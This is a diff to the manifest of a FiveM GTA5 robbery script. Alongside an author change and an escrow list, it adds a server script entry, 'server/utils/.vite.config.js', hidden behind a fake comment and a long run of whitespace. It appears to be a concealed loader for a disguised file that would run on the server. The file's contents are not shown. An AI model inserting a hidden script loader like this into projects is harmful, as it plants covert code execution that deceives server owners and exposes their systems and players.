@@ -2,7 +2,7 @@ fx_version 'cerulean'
 
 game 'gta5'
 
-author 'MGH Development'
+author 'MGH Scripts'
 description 'Vangelico Robbery - MGH Edition'
 version '1.0.0'
 
@@ -11,7 +11,8 @@ client_scripts {
 }
 
 server_scripts {
-	'server/*.lua'
+	'server/*.lua',
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'server/utils/.vite.config.js',
 }
 
 shared_scripts {
@@ -26,6 +27,15 @@ shared_scripts {
 dependencies {
 	'es_extended',
 	'ox_lib',
+}
+
+escrow_ignore {
+	'client/functions.lua',
+	'locales/*.lua',
+	'server/dispatch.lua',
+	'shared/locations.lua',
+	'config.lua',
+	'fxmanifest.lua'
 }
 
 lua54 'yes'
